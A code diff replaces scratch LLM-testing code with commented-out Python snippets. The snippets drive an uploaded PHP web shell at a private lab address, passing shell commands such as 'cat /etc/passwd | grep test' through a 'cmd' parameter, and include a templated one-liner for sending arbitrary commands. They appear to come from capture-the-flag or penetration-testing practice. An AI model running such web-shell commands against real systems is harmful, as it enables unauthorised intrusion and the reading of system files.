@@ -1,30 +1,23 @@
-## TEMP IMPORTS
-import os
-from langchain_core.prompts import ChatPromptTemplate
+# import requests
+#
+# url="http://10.10.195.15/uploads/Dysco.php5"
+# cmd="cat /etc/passwd | grep test"
+# response = requests.get(url, {'cmd':cmd})
+# print(response.content)
+#
+# import requests; print(requests.get(url, {'cmd':cmd}))
+#
+# import urllib.parse
+#
+# from urllib import parse, request
+# cmd="cat /etc/passwd | grep test"
+# print(parse.quote(cmd))
 
-### Perm Imports
-from utils.OpenRouter import ChatOpenRouter
-from langchain.prompts.prompt import PromptTemplate
-
-#######################################
-def main():
-        ## Testing LLM
-    # model = "microsoft/phi-4"
-    #
-    # llm = ChatOpenRouter(
-    #     model_name= model,
-    #     temperature=0.55
-    # )
-    # prompt = ChatPromptTemplate.from_template("tell me a short joke about {topic}")
-    # openrouter_chain = prompt | llm
-    # response = openrouter_chain.invoke({"topic": "warhammer 40k"})
-    # print(response.content)
-    #
-    # prompt = ChatPromptTemplate.from_template("What was the last question I asked?")
-    # openrouter_chain = prompt | llm
-    # response = openrouter_chain.invoke({})
-    # print(response.content)
+# from urllib import parse, request;print(request. get('${target_url}',{'cmd':'${command}'}))
 
 
-if __name__ == "__main__":
-    main()
+# from urllib import (parse, request);
+# url="http://10.10.195.15/uploads/Dysco.php5"
+# cmd="cat /etc/passwd | grep test"
+# response=request.urlopen(f"{url}?cmd={parse.quote(cmd)}").read().decode().split('<br/>')[3]
+# print(response)
